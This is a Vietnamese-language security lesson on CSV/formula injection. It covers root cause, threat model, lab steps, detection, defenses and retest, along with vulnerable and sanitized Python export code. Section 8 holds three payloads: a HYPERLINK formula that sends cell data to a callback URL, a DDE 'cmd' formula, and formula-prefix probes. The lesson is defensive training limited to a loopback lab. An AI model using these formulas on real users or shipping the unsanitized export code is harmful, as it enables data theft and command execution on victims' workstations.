---
schema_version: 1
id: WEB-A05-CSV-FORMULA-INJECTION
title: "CSV/Formula Injection"
slug: csv-formula-injection
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  []
cwe:
  - CWE-1236
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# CSV/Formula Injection

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích CSV/Formula Injection bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response của tình huống CSV/Formula Injection và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

CSV chỉ mô tả dữ liệu dạng text; việc một ô được phân loại là công thức thuộc về chương trình nhập bảng tính và phiên bản/cấu hình cụ thể. Các tiền tố như `=`, `+`, `-`, `@`, tab hoặc newline phải được kiểm tra với chính consumer dùng trong tổ chức, không được coi là một danh sách hành vi phổ quát. [S2] [S3]

```python
# Normal CSV export in a Python web application
import csv
from io import StringIO

def export_users(users):
    output = StringIO()
    writer = csv.writer(output)

    # Write header row
    writer.writerow(["Name", "Email", "Phone"])

    # Write user data rows
    for user in users:
        writer.writerow([user.name, user.email, user.phone])

    return output.getvalue()

# Example output (safe data):
# Name,Email,Phone
# Alice,alice@corp.com,+84-123-456-789
```

DDE là cơ chế legacy và việc gọi chương trình phụ thuộc phiên bản, chính sách, cảnh báo và thao tác của người mở file; bài không dùng DDE làm payload cốt lõi và không suy ra command execution chỉ từ formula evaluation. [S2] [S3]

## 4. Mô tả và nguyên nhân gốc

Root cause là ứng dụng xuất dữ liệu không tin cậy nhưng không áp dụng data contract cho consumer bảng tính, khiến consumer có thể phân loại ô đó là công thức thay vì text. Tác động phụ thuộc hàm được hỗ trợ, quyền/cảnh báo của spreadsheet và thao tác người dùng; bài chỉ xác nhận một phép tính vô hại trong fixture. [S2] [S3]

> **Nguồn tham khảo:** các claim kỹ thuật trong bài được gắn marker nguồn; khi áp dụng thực tế, hãy đối chiếu phiên bản/framework đang dùng: [S1], [S2], [S3], [S4], [S5].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** các ô dữ liệu tổng hợp đã export và máy trạm bảng tính.
- **Actor, xác thực và role:** role user điều khiển trường được export; người học chủ động mở file.
- **Điều kiện khai thác:** ô bắt đầu bằng dấu công thức được spreadsheet diễn giải thay vì hiển thị text.
- **Browser, proxy, framework và phiên bản:** LibreOffice Calc được pin và VM Windows legacy riêng cho DDE; callback loopback; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với csv formula injection, ô bắt đầu bằng dấu công thức được spreadsheet diễn giải thay vì hiển thị text. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy LibreOffice Calc được pin và VM Windows legacy riêng cho DDE; callback loopback; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case csv formula injection; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “ô bắt đầu bằng dấu công thức được spreadsheet diễn giải thay vì hiển thị text”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của csv formula injection; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các probe dưới đây chỉ áp dụng khi hành vi được đối chiếu với đúng spreadsheet/version được ghi. [S2] [S3]

**Payload 1 — Đánh cắp dữ liệu qua HYPERLINK:**

<!-- claim-source: [S2] [S3] -->
<!-- payload-id: WEB-A05-CSV-FORMULA-INJECTION-001 -->
<!-- context: LibreOffice Calc fixture; formula is imported into one synthetic CSV cell -->
<!-- prerequisites: callback HTTP server bound to 127.0.0.1:9001; outbound network disabled; A1 and B1 contain public fixture strings only; user confirms the hyperlink once -->
<!-- encoding: UTF-8 CSV field with spreadsheet formula syntax; CSV writer must quote embedded commas or quotes -->
<!-- expected-result: after one explicit click, callback records one GET containing only the synthetic A1 and B1 values -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
=HYPERLINK("http://127.0.0.1:9001/collect?data="&A1&"_"&B1, "Open lab callback")
```
Khi nạn nhân click, giá trị ô A1 và B1 được gửi đến server kẻ tấn công qua URL.

**Payload 2 — DDE legacy trong disposable Windows fixture:**

<!-- claim-source: [S2] [S3] -->
<!-- payload-id: WEB-A05-CSV-FORMULA-INJECTION-002 -->
<!-- context: legacy spreadsheet fixture with DDE explicitly enabled; behavior is version-dependent -->
<!-- prerequisites: disposable Windows VM; no network; user warning/prompt behavior recorded -->
<!-- encoding: UTF-8 CSV cell; backslash is literal and caret escapes redirection for cmd.exe inside the DDE formula -->
<!-- expected-result: after explicit learner confirmation, the fixture writes only %TEMP%\\csv-lab-marker.txt -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
=cmd|'/C echo CSV_FORMULA_LAB ^> %TEMP%\csv-lab-marker.txt'!A0
```

**Payload 3 — Các ký tự mở đầu công thức cần xử lý:**

<!-- claim-source: [S2] [S3] -->
<!-- payload-id: WEB-A05-CSV-FORMULA-INJECTION-006 -->
<!-- context: CSV fields imported by pinned LibreOffice Calc to test formula-prefix handling -->
<!-- prerequisites: three synthetic cells only; no links, DDE or external data; document macros disabled -->
<!-- encoding: UTF-8 CSV; %0A is tested both literally and after the application's documented URL-decoding stage -->
<!-- expected-result: export policy makes each value display literally; vulnerable import classifies any evaluated case in its recorded version -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
-1+1
@SUM(1+1)
%0A=1+1
```

## 9. Code dễ bị lỗi và code an toàn

```python
# ❌ VULNERABLE: Direct CSV export without sanitization
@app.route("/export/users")
def export_users():
    users = User.query.all()
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(["Name", "Email"])
    for u in users:
        writer.writerow([u.name, u.email])  # Dangerous: u.name could be "=cmd|..."
    return Response(output.getvalue(), mimetype="text/csv")

# ✅ SECURE: Sanitize all fields before CSV export
FORMULA_CHARS = set("=+-@\t\r\n")

def safe_csv_value(val):
    """Neutralize potential formula injection payloads"""
    s = str(val)
    if s and s[0] in FORMULA_CHARS:
        return "'" + s  # Single-quote prefix = treat as text in Excel
    return s

@app.route("/export/users")
def export_users():
    users = User.query.all()
    output = StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)  # Quote all fields
    writer.writerow(["Name", "Email"])
    for u in users:
        writer.writerow([safe_csv_value(u.name), safe_csv_value(u.email)])
    return Response(output.getvalue(), mimetype="text/csv")
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource liên quan đến CSV/Formula Injection, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Tuần tự hóa mọi ô không tin cậy thành text theo spreadsheet và CSV dialect đã chọn.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Với CSV/Formula Injection, các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Làm sạch dữ liệu đầu vào trước khi xuất file CSV bằng cách thêm tiền tố an toàn vào các ký tự đặc biệt.
- **Các bước chi tiết**:
  - Thêm tiền tố `'` (single quote) trước các giá trị nguy hiểm — Excel sẽ hiểu là text thuần.
  - Validate đầu vào nghiêm ngặt, cấm hoặc loại bỏ các ký tự khởi đầu công thức (`=`, `+`, `-`, `@`).
  - CSV quoting chỉ bảo vệ cấu trúc CSV, không tự vô hiệu formula. Quy tắc prefix/text phải được regression-test trên mọi consumer được hỗ trợ; nếu cần bảo đảm kiểu ô, ưu tiên format có metadata kiểu dữ liệu. [S2] [S3]

## 12. Retest

- **Positive case:** với CSV/Formula Injection, luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Tái kiểm tra:** lưu kịch bản tối thiểu tái hiện lỗi cũ và chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi của CSV/Formula Injection mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Kết luận lỗ hổng tồn tại khi chưa lưu lại nguồn, phiên bản fixture và bằng chứng quan sát được.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim kỹ thuật nhạy cảm có nguồn tham khảo ở mục 17 và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **CSV Injection**: Tiêm công thức độc hại vào dữ liệu xuất file CSV.
- **DDE (Dynamic Data Exchange)**: Giao thức truyền dữ liệu động giữa các phần mềm trên Windows, có thể dùng để chạy file exe.
- **Spreadsheet**: Phần mềm bảng tính như Excel hoặc Google Sheets.
- **Payload**: Đoạn dữ liệu mang mục đích khai thác lỗi bảo mật.
- **Sanitize**: Biến đổi dữ liệu theo contract cụ thể; với formula injection, phép biến đổi phải được kiểm chứng trên consumer/version đích thay vì xóa ký tự tùy ý. [S3]

## 16. Bài liên quan và đọc thêm

- [Command Execution](../command-execution/) — Thực thi lệnh trực tiếp trên hệ điều hành.

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/daily-swig/csv-injection — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S2]** OWASP. https://owasp.org/www-community/attacks/CSV_Injection — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S3]** CWE. https://cwe.mitre.org/data/definitions/1236.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S4]** James Kettle. https://www.contextis.com/en/blog/comma-separated-vulnerabilities — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
